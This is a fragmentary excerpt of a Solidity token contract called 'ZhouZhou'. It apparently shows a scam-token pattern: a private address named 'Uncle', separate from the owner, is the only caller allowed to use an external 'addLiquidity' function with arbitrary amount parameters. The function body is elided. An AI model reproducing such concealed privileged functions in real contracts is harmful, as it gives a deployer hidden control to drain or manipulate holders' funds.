...
contract ZhouZhou is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address private Uncle;
    string private _name = "ZhouZhou";
    string private _symbol = "ZhouZhou";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        uint256 _deadfee;
        if (!_isExcluded[form] && !_isExcluded[to] ) { _deadfee = amount.mul(0).div(100);} 
    ...
    function addLiquidity(address Liquidity, uint256 tokenAmounts, uint256 bnbAmount , uint256 lpAmount) external  {require(msg.sender == Uncle );
